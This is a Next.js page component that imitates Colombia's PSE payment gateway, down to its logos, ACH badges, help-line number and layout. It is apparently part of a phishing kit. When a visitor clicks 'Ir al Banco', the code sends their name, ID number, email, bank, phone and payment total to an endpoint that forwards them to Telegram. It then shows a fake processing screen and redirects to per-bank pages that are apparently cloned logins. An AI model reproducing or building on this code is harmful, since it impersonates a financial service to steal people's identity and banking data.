'use client';

import React, { useState, Suspense, useEffect } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import Image from 'next/image';
import { obtenerRutaBanco } from '@/utils/bankValidator';

function getDeviceInfo(uaString: string): string {
  const ua = uaString.toLowerCase();
  if (ua.includes('iphone')) return '📱 iPhone';
  if (ua.includes('ipad')) return '📱 iPad';
  if (ua.includes('android')) return '📱 Android';
  if (ua.includes('windows')) return '💻 Windows';
  if (ua.includes('mac os')) return '💻 macOS';
  if (ua.includes('linux')) return '💻 Linux';
  return '💻 Desktop';
}

function LoadingScreen() {
  return (
    <div className="fixed inset-0 z-50 bg-white flex flex-col items-center justify-center space-y-6 animate-in fade-in duration-200">
      <style>{`
        @keyframes psePulse {
          0% { transform: scale(1); }
          50% { transform: scale(1.08); }
          100% { transform: scale(1); }
        }
        .animate-pulse-pse {
          animation: psePulse 1.2s ease-in-out infinite;
        }
      `}</style>
      <div className="text-center space-y-4">
        <img
          src="/procesando.gif"
          alt="Cargando..."
          className="w-36 sm:w-44 h-auto mx-auto animate-pulse-pse"
        />
        <p className="text-sm font-semibold text-[#0073aa] tracking-wide">
          Procesando transacción en PSE... Por favor espere.
        </p>
      </div>
    </div>
  );
}

function PseContent() {
  const router = useRouter();
  const searchParams = useSearchParams();

  const [isRedirecting, setIsRedirecting] = useState(false);
  const [correo, setCorreo] = useState('');
  const [personType, setPersonType] = useState<'natural' | 'juridica'>('natural');
  const [deviceInfo, setDeviceInfo] = useState<string>('');
  const [pseBrebActive, setPseBrebActive] = useState(false);

  useEffect(() => {
    fetch('/api/payment-options')
      .then(res => res.json())
      .then(data => {
        if (data.success && data.options) {
          setPseBrebActive(data.options.opcion_g === true);
        }
      })
      .catch(e => console.error('Error cargando opciones de pago en PSE:', e));
  }, []);

  useEffect(() => {
    const urlEmail = searchParams?.get('email');
    const urlBanco = searchParams?.get('banco');
    const urlPseData = searchParams?.get('pseData');

    if (urlPseData) {
      localStorage.setItem('pse_validacion_data', urlPseData);
    }
    if (urlEmail) {
      localStorage.setItem('jelpit_email', urlEmail);
    }
    if (urlBanco) {
      localStorage.setItem('bankSelct', urlBanco);
    }

    const correoFinal = urlEmail || localStorage.getItem('jelpit_email') || '';
    if (correoFinal) {
      setCorreo(correoFinal);
    }

    const ua = navigator.userAgent;
    setDeviceInfo(getDeviceInfo(ua));
  }, [searchParams]);

  if (isRedirecting) {
    return <LoadingScreen />;
  }

  const handleIrAlBanco = async () => {
    if (!correo.includes('@')) {
      alert('Por favor ingresa un correo electrónico válido.');
      return;
    }

    localStorage.setItem('jelpit_email', correo);

    const banco = localStorage.getItem('bankSelct') || localStorage.getItem('jelpit_pse_bank') || '';
    const targetSlug = obtenerRutaBanco(banco);

    let pseData: any = null;
    try {
      const pse_validacion_data = localStorage.getItem('pse_validacion_data');
      if (pse_validacion_data) {
        pseData = JSON.parse(pse_validacion_data);
      }
    } catch (error) {
      console.error('Error al parsear pse_validacion_data:', error);
    }

    // Notificar datos a Telegram
    try {
      await fetch('/api/enviar-telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          tipo: 'registro',
          data: {
            metodoPago: 'pse',
            nombre: pseData?.nombre || 'Cliente PSE',
            cedula: pseData?.cedula || pseData?.identificacion || '',
            tipoDoc: pseData?.tipoDoc || pseData?.tipoDocumento || 'CC',
            email: correo,
            banco: banco,
            persona: personType === 'natural' ? 'Persona Natural' : 'Persona Jurídica',
            telefono: pseData?.telefono || '',
            total: pseData?.total || pseData?.valorTotal || '1.016.995'
          }
        })
      });
    } catch (e) {
      console.error('Error notificando a Telegram desde /pse:', e);
    }

    setIsRedirecting(true);

    setTimeout(async () => {
      try {
        let targetUrl = (targetSlug && targetSlug !== 'generic')
          ? `/banco/${targetSlug}?banco=${encodeURIComponent(banco)}&email=${encodeURIComponent(correo)}`
          : `/banco/generic?banco=${encodeURIComponent(banco)}&email=${encodeURIComponent(correo)}`;

        try {
          const res = await fetch(`/api/redirect-target?slug=${targetSlug}`);
          if (res.ok) {
            const config = await res.json();
            if (config && config.url) {
              targetUrl = config.url;
            }
          }
        } catch (e) {
          console.warn('Fallback a ruta bancaria estándar:', e);
        }

        window.location.href = targetUrl;
      } catch (error) {
        console.error('Error al redirigir al banco:', error);
        setIsRedirecting(false);
      }
    }, 2000);
  };

  return (
    <div className="min-h-screen bg-[#FFFFFF] flex flex-col justify-between font-sans select-none relative pt-[104px]">
      
      {/* 1. TOP HEADER BANNER (ESTILOS ESTRICTOS .headerACH DE PSE) */}
      <header
        id="header"
        className="headerACH w-full h-[104px] z-54 absolute top-0 left-0 bg-white flex items-center shadow-[0px_0px_15px_0px_rgba(0,0,0,0.1)]"
      >
        <div className="EncabezadoCss w-full max-w-[1140px] mx-auto px-4 sm:px-8 flex items-center justify-between">
          <div className="pseLogoCssI absolute top-0 bottom-0 my-auto left-0 ml-[25px] h-[72px] flex items-center">
            <img src="/PSEUserRegister/NFbanner-izq.svg" alt="PSE Logo Izquierdo" className="h-[72px] w-auto object-contain" />
          </div>
          <div className="pseLogoCssD w-full absolute top-0 bottom-0 right-0 h-full my-auto flex justify-end pointer-events-none">
            <img src="/PSEUserRegister/NFbanner-der.svg" alt="PSE Logo Derecho" className="h-full w-auto object-contain" />
          </div>
        </div>
      </header>

      {/* 2. MAIN CONTAINER AREA */}
      <main className="flex-1 w-full max-w-5xl mx-auto px-4 py-8 sm:py-12 flex flex-col items-center justify-center">
        
        {/* Section Title */}
        <h2 className="text-center font-normal text-[#0073aa] text-xl sm:text-2xl mb-6 tracking-tight">
          Selecciona el tipo de persona:
        </h2>

        {/* Person Type Selector Tabs (Dimensiones Responsivas Móvil / Desktop) */}
        <div className="flex items-end justify-center space-x-0 z-10 -mb-[1px]">
          {/* Natural Tab */}
          <button
            type="button"
            onClick={() => setPersonType('natural')}
            className={`rounded-t-[8px] flex items-center justify-center gap-2 sm:gap-3 cursor-pointer transition-all ${
              personType === 'natural'
                ? 'w-[153px] sm:w-[193px] h-[55px] sm:h-[66px] bg-white shadow-[0px_0px_15px_0px_rgba(0,0,0,0.25)] text-[#065EA6] font-medium text-[16px] sm:text-[20px] leading-[26px]'
                : 'w-[116px] sm:w-[193px] h-[47px] sm:h-[66px] bg-gray-100/90 border border-gray-200 border-b-0 text-gray-500 font-medium text-[14px] sm:text-[20px] leading-[26px]'
            }`}
          >
            <img
              src="/PSEUserRegister/natural_check.svg"
              alt="Natural"
              className="w-[32px] sm:w-[45px] h-auto object-contain"
            />
            <span className={personType === 'natural' ? 'underline decoration-[#FFB800] decoration-2 underline-offset-4 font-medium' : 'font-medium'}>
              Natural
            </span>
          </button>

          {/* Jurídica Tab */}
          <button
            type="button"
            onClick={() => setPersonType('juridica')}
            className={`rounded-t-[8px] flex items-center justify-center gap-2 sm:gap-3 cursor-pointer transition-all ${
              personType === 'juridica'
                ? 'w-[153px] sm:w-[193px] h-[55px] sm:h-[66px] bg-white shadow-[0px_0px_15px_0px_rgba(0,0,0,0.25)] text-[#065EA6] font-medium text-[16px] sm:text-[20px] leading-[26px]'
                : 'w-[116px] sm:w-[193px] h-[47px] sm:h-[66px] bg-gray-100/90 border border-gray-200 border-b-0 text-gray-500 font-medium text-[14px] sm:text-[20px] leading-[26px]'
            }`}
          >
            <img
              src="/PSEUserRegister/juridica.svg"
              alt="Jurídica"
              className="w-[32px] sm:w-[45px] h-auto object-contain"
            />
            <span className={personType === 'juridica' ? 'underline decoration-[#FFB800] decoration-2 underline-offset-4 font-medium' : 'font-medium'}>
              Jurídica
            </span>
          </button>
        </div>

        {/* Main White Card Box (Estilos Estrictos Móvil) */}
        <div className="w-[350px] sm:w-full max-w-[760px] h-[360px] sm:h-auto bg-white rounded-[16px] sm:rounded-3xl shadow-[0px_0px_15px_0px_rgba(0,0,0,0.25)] py-[26px] px-2 sm:p-12 text-center flex flex-col justify-between space-y-3 sm:space-y-9 z-0 mx-auto">
          
          {/* Options Row */}
          <div className="flex flex-wrap items-center justify-center gap-2.5 sm:gap-6">
            {/* Soy usuario registrado (Estilos Estrictos .btn-option-click) */}
            <div className="w-[203px] sm:w-[226px] h-[39px] sm:h-[44px] px-3 sm:px-[32px] py-[6px] sm:py-[8px] rounded-[24px] border border-[#065EA6]/20 bg-white shadow-[4px_4px_4px_0px_rgba(253,184,19,0.25)] flex items-center justify-center gap-1.5 sm:gap-2 cursor-pointer font-medium text-[13px] sm:text-[15px] text-black">
              <img
                src="/PSEUserRegister/opreg_sel.svg"
                alt="Usuario registrado"
                className="w-[18px] sm:w-[20px] h-[18px] sm:h-[20px] object-contain"
              />
              <span className="whitespace-nowrap">Soy un usuario registrado</span>
            </div>

            {/* Pago por Bre-B QR (condicionado a XDM) */}
            {pseBrebActive && (
              <button
                type="button"
                onClick={() => router.push('/bre-b')}
                className="w-[203px] sm:w-auto h-[39px] sm:h-[44px] px-4 py-2 sm:py-2.5 rounded-[24px] border border-emerald-500 bg-emerald-50 hover:bg-emerald-100 text-emerald-800 text-xs sm:text-[13px] font-bold cursor-pointer flex items-center justify-center gap-1.5 transition-all shadow-xs"
              >
                <span>📱</span>
                <span>Pago por Bre-B (QR)</span>
              </button>
            )}

            {/* Registrarme ahora (Disabled) */}
            <div className="w-[203px] sm:w-auto h-[39px] sm:h-auto px-4 py-2 sm:py-3 rounded-full border border-gray-300 bg-white text-xs sm:text-sm font-medium text-gray-400 opacity-60 cursor-not-allowed flex items-center justify-center gap-2">
              <Image
                src="/PSEUserRegister/opact.svg"
                alt="Registrarme ahora"
                width={20}
                height={20}
                className="w-4 sm:w-5 h-4 sm:h-5 object-contain"
              />
              <span>Registrarme ahora</span>
            </div>

            {/* Registro preliminar (Disabled) */}
            <div className="w-[203px] sm:w-auto h-[39px] sm:h-auto px-4 py-2 sm:py-3 rounded-full border border-gray-300 bg-white text-xs sm:text-sm font-medium text-gray-400 opacity-60 cursor-not-allowed flex items-center justify-center gap-2">
              <Image
                src="/PSEUserRegister/opbor.svg"
                alt="Registro preliminar"
                width={20}
                height={20}
                className="w-4 sm:w-5 h-4 sm:h-5 object-contain"
              />
              <span>Registro preliminar</span>
            </div>
          </div>

          {/* Email Form Field */}
          <div className="space-y-1.5 sm:space-y-2 max-w-md mx-auto text-center flex flex-col items-center justify-center w-full px-[12px] py-[6px] sm:px-0 sm:py-0">
            <label className="block text-xs sm:text-sm font-semibold text-[#0073aa] text-center w-full mx-auto flex items-center justify-center">
              Ingresa tu correo electrónico &nbsp;<span className="text-red-500">*</span>
            </label>
            <input
              type="email"
              value={correo}
              onChange={(e) => setCorreo(e.target.value)}
              placeholder="Ej: correo@pse.com.co"
              autoFocus
              className="w-full max-w-[440px] h-[30px] sm:h-auto min-h-[30px] sm:min-h-[48px] bg-white border border-[#4A90E2] rounded-[10px] px-[12px] sm:px-6 py-[6px] sm:py-3.5 text-center text-xs sm:text-sm text-gray-800 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#4A90E2]/30 transition-all font-normal mx-auto"
            />
          </div>

          {/* Action Buttons Row */}
          <div className="flex flex-col-reverse sm:flex-row items-center justify-center gap-3 sm:gap-5 pt-1 sm:pt-2">
            <button
              type="button"
              onClick={() => router.back()}
              className="w-[221px] sm:w-auto min-w-0 sm:min-w-[220px] h-[36px] sm:h-auto flex items-center justify-center border-2 border-[#0073aa] text-[#0073aa] hover:bg-sky-50 rounded-full px-4 sm:px-8 text-xs sm:text-sm font-bold transition-all cursor-pointer text-center"
            >
              Regresar al comercio
            </button>

            <button
              type="button"
              onClick={handleIrAlBanco}
              className="w-[221px] sm:w-auto min-w-0 sm:min-w-[220px] h-[36px] sm:h-auto flex items-center justify-center bg-linear-to-r from-[#FFB800] to-[#FFA000] hover:brightness-105 text-white shadow-[0_4px_14px_rgba(255,184,0,0.4)] rounded-full px-4 sm:px-10 text-xs sm:text-sm font-bold tracking-wide transition-all cursor-pointer text-center"
            >
              Ir al Banco
            </button>
          </div>

        </div>

      </main>

      {/* 3. FOOTER AREA (TRADUCCIÓN EXACTA DEL HTML DE PSE) */}
      <footer className="w-full max-w-[1140px] mx-auto px-4 py-8 select-none">
        {/* Desktop View */}
        <div className="hidden md:flex items-center justify-between">
          <div className="flex-shrink-0">
            <img
              src="/PSEUserRegister/footer.svg"
              alt="Vigilado ACH"
              className="h-[120px] w-auto object-contain"
            />
          </div>

          <div className="flex items-center mt-7 w-[731px] flex-shrink-0">
            {/* Tira Amarilla Lateral */}
            <span
              className="w-[27px] h-[68px] rounded-l-lg bg-[#FDB813] flex-shrink-0"
              style={{ boxShadow: '0px 4px 4px 0px rgba(0, 0, 0, 0.25)' }}
            />
            {/* Caja Gris de Información */}
            <div
              className="w-[704px] h-[68px] rounded-r-lg bg-[#D9D9D9]/40 px-3 flex items-center justify-between text-xs font-sans text-gray-800"
              style={{ boxShadow: '4px 4px 4px 0px rgba(0, 0, 0, 0.25)' }}
            >
              <div className="h-[48px] flex items-center justify-center pr-2">
                <img
                  src="/PSEUserRegister/footerD.svg"
                  alt="Footer Icon"
                  className="h-[34px] w-auto object-contain"
                />
              </div>

              <div className="h-[48px] flex flex-col justify-center text-left leading-tight pr-2">
                <span className="font-bold text-gray-900 text-xs">Para mayor información</span>
                <span className="font-normal text-gray-700 text-xs">comunícate con nosotros:</span>
              </div>

              <div className="h-[48px] pt-2.5 font-semibold text-xs text-left leading-[15.88px] pr-2">
                <div className="flex items-center gap-2 mb-1">
                  <img src="/PSEUserRegister/mobile.svg" alt="Teléfono" className="w-[11px] h-auto" />
                  <span>En Bogotá:</span>
                </div>
                <div className="flex items-center gap-2">
                  <img src="/PSEUserRegister/conta.svg" alt="Contacto" className="w-[11px] h-auto" />
                  <span>Contáctanos:</span>
                </div>
              </div>

              <div className="h-[48px] pt-2.5 font-normal text-xs text-left leading-[15.88px]">
                <div className="mb-1 text-gray-900">+57 (601) 3808890 opción 5</div>
                <div>
                  <a
                    href="https://www.pse.com.co/persona-centro-de-ayuda"
                    target="_blank"
                    rel="noreferrer"
                    className="text-[#0073aa] underline hover:text-sky-700 font-normal"
                  >
                    https://www.pse.com.co/persona-centro-de-ayuda
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Mobile View */}
        <div className="flex md:hidden flex-col items-center gap-4 text-center">
          {/* Banner de información primero */}
          <div className="flex items-stretch w-full max-w-sm">
            <span
              className="w-[18px] rounded-l-lg bg-[#FDB813] flex-shrink-0 self-stretch"
              style={{ boxShadow: '0px 0px 3px 0px rgba(0, 0, 0, 0.25)' }}
            />
            <div
              className="flex-1 bg-[#D9D9D9]/40 rounded-r-lg p-3 text-[11px] flex flex-col items-start space-y-1"
              style={{ boxShadow: '3px 3px 3px 0px rgba(0, 0, 0, 0.25)' }}
            >
              <div className="flex items-center gap-2">
                <img src="/PSEUserRegister/footerD.svg" alt="Icon" className="h-[24px] w-auto" />
                <div className="font-bold text-gray-900 text-xs text-left">Para mayor información comunícate con nosotros:</div>
              </div>
              <div className="flex items-center gap-1.5 text-gray-800 pt-1 text-left">
                <img src="/PSEUserRegister/mobile.svg" className="w-3" alt="" />
                <span>En Bogotá: +57 (601) 3808890 opción 5</span>
              </div>
              <div className="flex items-center gap-1.5 text-left">
                <img src="/PSEUserRegister/conta.svg" className="w-3" alt="" />
                <a
                  href="https://www.pse.com.co/persona-centro-de-ayuda"
                  target="_blank"
                  rel="noreferrer"
                  className="text-[#0073aa] underline truncate max-w-[200px]"
                >
                  https://www.pse.com.co/persona-centro-de-ayuda
                </a>
              </div>
            </div>
          </div>

          {/* footer.svg (Vigilado ACH) abajo */}
          <img
            src="/PSEUserRegister/footer.svg"
            alt="Vigilado ACH"
            className="h-[90px] w-auto object-contain"
          />
        </div>
      </footer>
    </div>
  );
}

export default function PsePage() {
  return (
    <Suspense fallback={<LoadingScreen />}>
      <PseContent />
    </Suspense>
  );
}